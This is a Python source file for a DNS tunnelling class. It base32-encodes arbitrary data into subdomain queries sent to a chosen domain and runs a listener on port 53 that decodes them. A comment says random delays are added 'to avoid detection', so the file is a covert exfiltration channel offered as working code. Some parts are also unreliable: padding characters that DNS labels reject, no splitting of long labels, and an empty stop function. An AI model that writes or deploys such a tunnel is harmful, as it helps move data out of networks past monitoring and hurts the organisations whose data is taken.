import socket
import base64
import time
import random
import logging
from datetime import datetime
import dns.resolver
import dns.message
import dns.rdatatype
import dns.rdataclass
import dns.rcode
import threading

class DNSTunnel:
    def __init__(self, domain, nameserver="8.8.8.8"):
        self.domain = domain
        self.nameserver = nameserver
        self.resolver = dns.resolver.Resolver()
        self.resolver.nameservers = [nameserver]
        self.setup_logging()
        
    def setup_logging(self):
        logging.basicConfig(
            level=logging.INFO,
            format='%(asctime)s - %(levelname)s - %(message)s',
            handlers=[
                logging.FileHandler('dns_tunnel.log'),
                logging.StreamHandler()
            ]
        )
        
    def encode_data(self, data):
        """Encode data for DNS tunneling"""
        try:
            # Convert data to base32 (DNS-safe)
            encoded = base64.b32encode(data.encode()).decode()
            return encoded
        except Exception as e:
            logging.error(f"Error encoding data: {str(e)}")
            return None
            
    def decode_data(self, encoded_data):
        """Decode data from DNS tunneling"""
        try:
            # Decode base32 data
            decoded = base64.b32decode(encoded_data.encode()).decode()
            return decoded
        except Exception as e:
            logging.error(f"Error decoding data: {str(e)}")
            return None
            
    def send_data(self, data, subdomain="data"):
        """Send data through DNS tunnel"""
        try:
            encoded_data = self.encode_data(data)
            if not encoded_data:
                return False
                
            # Create DNS query with encoded data
            query = f"{encoded_data}.{subdomain}.{self.domain}"
            self.resolver.resolve(query, 'A')
            
            # Add random delay to avoid detection
            time.sleep(random.uniform(0.1, 0.5))
            return True
            
        except Exception as e:
            logging.error(f"Error sending data: {str(e)}")
            return False
            
    def receive_data(self, callback=None):
        """Receive data through DNS tunnel"""
        try:
            # Create DNS server
            server = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            server.bind(('0.0.0.0', 53))
            
            while True:
                try:
                    data, addr = server.recvfrom(1024)
                    message = dns.message.from_wire(data)
                    
                    # Process DNS query
                    for question in message.question:
                        if question.name.to_text().endswith(self.domain):
                            encoded_data = question.name.to_text().split('.')[0]
                            decoded_data = self.decode_data(encoded_data)
                            
                            if decoded_data and callback:
                                callback(decoded_data)
                                
                except Exception as e:
                    logging.error(f"Error processing DNS query: {str(e)}")
                    continue
                    
        except Exception as e:
            logging.error(f"Error starting DNS server: {str(e)}")
            return False
            
    def start_tunnel(self, callback=None):
        """Start DNS tunnel in background"""
        try:
            tunnel_thread = threading.Thread(
                target=self.receive_data,
                args=(callback,),
                daemon=True
            )
            tunnel_thread.start()
            return True
        except Exception as e:
            logging.error(f"Error starting tunnel: {str(e)}")
            return False
            
    def stop_tunnel(self):
        """Stop DNS tunnel"""
        try:
            # Cleanup code here
            return True
        except Exception as e:
            logging.error(f"Error stopping tunnel: {str(e)}")
            return False
            
    def test_connection(self):
        """Test DNS tunnel connection"""
        try:
            test_data = "test_connection"
            if self.send_data(test_data):
                logging.info("DNS tunnel test successful")
                return True
            else:
                logging.error("DNS tunnel test failed")
                return False
        except Exception as e:
            logging.error(f"Error testing connection: {str(e)}")
            return False 